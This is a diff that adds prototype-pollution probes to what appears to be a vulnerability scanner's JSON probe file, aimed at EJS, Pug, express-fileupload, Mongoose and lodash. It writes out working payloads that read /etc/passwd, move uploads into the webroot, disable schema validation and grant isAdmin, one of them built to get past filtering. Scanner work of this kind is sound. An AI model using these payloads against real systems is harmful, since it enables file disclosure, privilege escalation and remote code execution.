@@ -81,6 +81,103 @@
           "variables": {}
         }
       ]
+    },
+    "ejs_template_gadget": {
+      "description": "EJS template engine reads outputFunctionName, escapeFunction, compileDebug from prototype. Polluting Object.prototype.outputFunctionName with attacker JS yields RCE on next render. Fixed in EJS 3.1.7+; older versions widely deployed. Refer to PortSwigger and HackTricks 'EJS prototype pollution' for full payload.",
+      "tech_match": ["node", "express", "ejs"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"__proto__\":{\"outputFunctionName\":\"<EJS-RCE-PAYLOAD>\"}}",
+          "description": "[Manual] EJS RCE gadget — use a published payload from PortSwigger / HackTricks that breaks out of the outputFunctionName context and runs spawn-style JS. Verify with id/whoami marker in response.",
+          "matchers": [
+            {"type": "word", "any": ["uid=", "gid="]},
+            {"type": "status", "status": [200, 500]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 70,
+          "variables": {"manual_chain": true}
+        }
+      ]
+    },
+    "pug_compile_options_gadget": {
+      "description": "Pug template engine respects pretty, self, globals, compileDebug, filename from compile options. Pollute filename with traversal path and trigger render — file disclosure or RCE depending on filter.",
+      "tech_match": ["node", "express", "pug"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"__proto__\":{\"compileDebug\":true,\"filename\":\"/etc/passwd\"}}",
+          "description": "Pug filename gadget — render error includes file content when compileDebug=true.",
+          "matchers": [
+            {"type": "word", "any": ["root:x:0:0", "daemon:"]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 65,
+          "variables": {"manual_chain": true}
+        }
+      ]
+    },
+    "express_fileupload_rename_gadget": {
+      "description": "express-fileupload <1.4.0 reads parseNested, useTempFiles, tempFileDir from prototype. Polluting tempFileDir to a writable webroot path makes uploaded files reachable as static content (RCE if PHP/JSP allowed in that dir).",
+      "tech_match": ["node", "express-fileupload"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"__proto__\":{\"useTempFiles\":true,\"tempFileDir\":\"/var/www/html/\"}}",
+          "description": "Pollute tempFileDir to webroot. Subsequent file upload lands in static-served directory.",
+          "matchers": [
+            {"type": "status", "status": [200, 201]}
+          ],
+          "severity": "critical",
+          "confidence_boost": 60,
+          "variables": {"manual_chain": true}
+        }
+      ]
+    },
+    "mongoose_schema_pollution": {
+      "description": "Mongoose schema option fields (autoIndex, collection, versionKey, strict) are read from prototype. Setting strict=false lets attacker write arbitrary fields — bypasses schema validation and enables IDOR/role escalation if downstream code trusts schema.",
+      "tech_match": ["mongoose", "mongodb", "node"],
+      "param_match": [],
+      "probes": [
+        {
+          "payload": "{\"__proto__\":{\"strict\":false}}",
+          "description": "Pollute Mongoose strict mode = false. Subsequent .create({role:'admin'}) succeeds even when schema doesn't include role.",
+          "matchers": [
+            {"type": "status", "status": [200, 201]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {"manual_chain": true}
+        }
+      ]
+    },
+    "lodash_set_value_chain": {
+      "description": "lodash _.set / _.merge / set-value — multi-step pollution via attacker-controlled keypath string. Path traversal-style '__proto__.isAdmin' becomes nested object set.",
+      "tech_match": ["lodash", "node", "set-value"],
+      "param_match": ["path", "key"],
+      "probes": [
+        {
+          "payload": "{\"path\":\"__proto__.isAdmin\",\"value\":true}",
+          "description": "set-value pollution via keypath string. Subsequent if (user.isAdmin) checks pass for any user.",
+          "matchers": [
+            {"type": "status", "status": [200]},
+            {"type": "word", "any": ["admin", "permission"]}
+          ],
+          "severity": "high",
+          "confidence_boost": 50,
+          "variables": {"manual_chain": true}
+        },
+        {
+          "payload": "{\"path\":\"constructor.prototype.isAdmin\",\"value\":true}",
+          "description": "Alternate path defeating __proto__ filtering — constructor.prototype is functionally equivalent.",
+          "matchers": [
+            {"type": "status", "status": [200]}
+          ],
+          "severity": "high",
+          "confidence_boost": 45,
+          "variables": {"manual_chain": true}
+        }
+      ]
     }
   }
 }
